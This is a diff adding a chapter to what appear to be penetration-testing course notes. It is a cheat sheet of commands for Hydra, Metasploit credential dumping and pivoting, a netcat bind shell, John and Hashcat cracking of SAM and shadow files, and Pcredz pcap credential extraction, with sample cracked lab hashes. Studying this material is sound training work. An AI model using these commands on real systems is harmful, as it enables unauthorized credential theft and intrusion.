@@ -95,6 +95,95 @@ sc start ncservice2
 ```
 wmic process call create "c:\tools\nc.exe -l -p 4444 -e cmd.exe"
 ```
+# Chapter 4
+
+### Hydra 
+
+```
+cat /opt/password.lst | pw-inspector -m 6 -n -u -l -c 2 > /tmp/custom.lst
+```
+```
+xhydra
+```
+
+### MSF
+
+```
+run post/windows/gather/smart_hashdump
+```
+```
+load kiwi
+creds_all
+```
+```
+run post/multi/manage/autoroute SUBNET=10.10.10.0 CMD=add
+```
+CMD=autoadd should be fine in most cases   
+you will now to able to target anthing on 10.10.10.0 subnet in msf
+
+```
+set Proxies socks4:127.0.0.1:9999
+Proxies => socks4:127.0.0.1:9999
+msf5 exploit(windows/smb/psexec) > set ReverseAllowProxy true
+```
+MSF usage of ssh -D proxy
+
+## John
+
+```
+john --show sam.txt
+Administrator:CRACKME:500:A5C67174B2A219D1AAD3B435B51404EE:363DD639AD34B6C5153C0F51165AB830:::
+charlie:EILRAHC:1007:380B4695FE1449EBAAD3B435B51404EE:03F9CC43288014DEE4FA4B190D9CA948:::
+dizzy:INTERNET12:1008:3EACDEE7E4395079BE516DA459FE4E65:1274D7B32A9ABDDA01A5067FE9FBB32B:::
+Guest:NO PASSWORD:501:NO PASSWORD*********************:NO PASSWORD*********************:::
+monk:VIRGINIA:1009:AF83DBF0052EE4717584248B8D2C9F9E:A65C3DA63FDB6CA22C172B13169D62A5:::
+ted:NEWPASS:1006:09EEAB5AA415D6E4AAD3B435B51404EE:18DA6C2895C549E266745951D5DC66CB:::
+
+8 password hashes cracked, 6 left
+```
+```
+john --format=nt sam.txt
+```
+```
+unshadow passwd_copy shadow_copy > combined.txt
+john combined.txt --format=crypt
+```
+## Hashcat
+```
+hashcat -w 3 -a 0 -m 3000 -o cracked.txt coursefiles/sam.txt /opt/password.lst
+```
+```
+hashcat -w 3 -a 0 -m 3000 -o cracked.txt coursefiles/sam.txt names.txt /opt/password.lst -r /usr/local/share/doc/hashcat/rules/best64.rule
+```
+```
+hashcat -w 3 -a 0 -m 1800 -o cracked.txt shadow_copy names.txt clear.txt /opt/password.lst -r /usr/local/share/doc/hashcat/rules/best64.rule
+```
+
+## LM to NTLM   
+```
+/opt/metasploit-framework/tools/password/lm2ntcrack.rb -t NTLM -p INTERNET12 -a 1274D7B32A9ABDDA01A5067FE9FBB32B
+```
+## Pulling Creds from .pcap
+```
+./Pcredz -v -f /tmp/winauth.pcap
+```
+file is saved to `CredentialDump-Session.log`
+
+```
+grep clark CredentialDump-Session.log | cut -d ' ' -f 5 | tee hash.txt
+```
+```
+john hash.txt
+```
+or
+```
+hashcat -m 5600 --potfile-path ~/.hashcat/hashcat.potfile --show --outfile-format 2 hash.txt
+```
+### VoIP
+
+In wireshark dropdown menues  telephone > RTP > RTP Streams   
+then select stream and click Analyze   
+Play Streams   
 
 
 # Chapter 5
